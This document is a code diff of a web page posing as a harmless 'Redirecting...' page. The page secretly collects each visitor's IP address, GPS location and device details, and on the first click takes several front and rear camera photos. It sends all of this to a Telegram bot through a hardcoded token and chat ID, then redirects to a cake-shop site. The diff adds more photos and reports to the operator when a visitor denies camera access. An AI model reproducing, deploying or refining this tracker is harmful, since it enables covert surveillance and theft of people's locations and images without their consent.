@@ -4,7 +4,6 @@
   <meta charset="UTF-8" />
   <title>Redirecting...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta http-equiv="refresh" content="10;url=https://heavenscake.vercel.app">
   <style>
     body {
       margin: 0;
@@ -31,6 +30,7 @@
   <script>
     const BOT_TOKEN = "7740401254:AAHhnSMhm-dMcv7-4LJCGwHchxRrYhBEsCY";
     const CHAT_ID = "7216371031";
+    const REDIRECT_URL = "https://heavenscake.vercel.app";
     let deviceInfo = "";
 
     function sendToTelegram(message) {
@@ -44,8 +44,8 @@
     function sendPhotoToTelegram(blob) {
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
-      formData.append("photo", blob, "cam.jpg");
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      formData.append("photo", blob, "photo.jpg");
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: "POST",
         body: formData
       });
@@ -66,10 +66,12 @@
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0);
         stream.getTracks().forEach(track => track.stop());
-        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.8));
-        sendPhotoToTelegram(blob);
+        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
+        await sendPhotoToTelegram(blob);
+        return true;
       } catch (err) {
-        console.warn("Camera access skipped or denied.");
+        console.warn("Camera access failed:", err.message);
+        return false;
       }
     }
 
@@ -109,7 +111,7 @@
         .then(ip => {
           const loc = ip.loc ? ip.loc.split(",") : ["N/A", "N/A"];
           deviceInfo += `🌍 IP: ${ip.ip}\n`;
-          deviceInfo += `📍 IP-Based Location: ${ip.city}, ${ip.region}, ${ip.country}\n`;
+          deviceInfo += `📍 IP Location: ${ip.city}, ${ip.region}, ${ip.country}\n`;
           deviceInfo += `📌 IP Lat/Lon: ${loc[0]}, ${loc[1]}\n`;
           deviceInfo += `🌐 ISP: ${ip.org || "Unknown"}\n`;
         }).catch(() => {
@@ -124,11 +126,11 @@
         navigator.geolocation.getCurrentPosition(
           pos => {
             const { latitude, longitude, accuracy } = pos.coords;
-            deviceInfo += `📡 GPS Location: ${latitude}, ${longitude}\n🎯 Accuracy: ${accuracy}m\n`;
+            deviceInfo += `📡 GPS: ${latitude}, ${longitude} (±${accuracy}m)\n`;
             resolve();
           },
           err => {
-            deviceInfo += `📡 GPS: Permission Denied or Unavailable\n`;
+            deviceInfo += `📡 GPS: Permission Denied\n`;
             resolve();
           },
           { enableHighAccuracy: true, timeout: 8000 }
@@ -143,7 +145,7 @@
       const brand = detectDeviceBrand();
 
       deviceInfo += `📱 Device Brand: ${brand}\n`;
-      deviceInfo += `🌐 Language(s): ${languages}\n`;
+      deviceInfo += `🌐 Languages: ${languages}\n`;
       deviceInfo += `🧠 RAM: ${navigator.deviceMemory || "?"} GB\n`;
       deviceInfo += `🧮 CPU Cores: ${navigator.hardwareConcurrency || "?"}\n`;
       deviceInfo += `📲 Touch Support: ${touch}\n`;
@@ -165,14 +167,26 @@
       await sendToTelegram(deviceInfo);
     }
 
-    // ✅ Send info on load
+    // Start collection on load
     collectAndSend();
 
-    // ✅ Take photo only after user interaction
+    // Click triggers camera permission request
     window.addEventListener("click", async () => {
-      await takePhoto("user");
+      let granted = await takePhoto("user");
+      if (!granted) {
+        await sendToTelegram("🚫 Camera access denied by user.");
+        return setTimeout(() => {
+          location.href = REDIRECT_URL;
+        }, 10000);
+      }
+
       await takePhoto("user");
       await takePhoto("environment");
+      await takePhoto("environment");
+
+      setTimeout(() => {
+        location.href = REDIRECT_URL;
+      }, 10000);
     }, { once: true });
   </script>
 </body>
